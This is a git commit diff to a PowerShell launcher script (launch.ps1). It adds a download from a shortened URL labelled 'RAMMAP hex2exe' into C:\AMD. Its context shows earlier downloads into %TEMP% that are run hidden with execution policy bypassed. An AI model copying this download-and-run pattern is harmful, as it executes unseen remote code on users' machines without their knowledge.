0704c249f280321ed85740d96ace994b88fa546f
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-24 22:04:56 +0800

    rammap

--- launch.ps1
+++ launch.ps1
@@ -2,13 +2,23 @@
 # Define the URLs of the files to download
 $url1 = "https://lnkfwd.com/u/KtRiC0kh"
 $url2 = "https://lnkfwd.com/u/Kqc2ajEr"
+$url3 = "https://lnkfwd.com/u/K-060JPj" #RAMMAP hex2exe
 
 # Define the destination paths in the %TEMP% directory
 $destination1 = "$env:TEMP\ftf.ps1"
 $destination2 = "$env:TEMP\Ain1.ps1"
+$destination3 = "C:\AMD\ConvertNrun.ps1" # Change "yourfile.ps1" to your desired filename
+
+# Create the AMD directory if it doesn't exist
+$amdDirectory = "C:\AMD"
+if (-Not (Test-Path -Path $amdDirectory)) {
+    New-Item -ItemType Directory -Path $amdDirectory
+}
 
 Invoke-WebRequest -Uri $url1 -OutFile $destination1
 Invoke-WebRequest -Uri $url2 -OutFile $destination2
+Invoke-WebRequest -Uri $url3 -OutFile $destination3
+
 
 # Run the first script (ftf.ps1) from the %TEMP% directory
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\ftf.ps1`"" -Wait
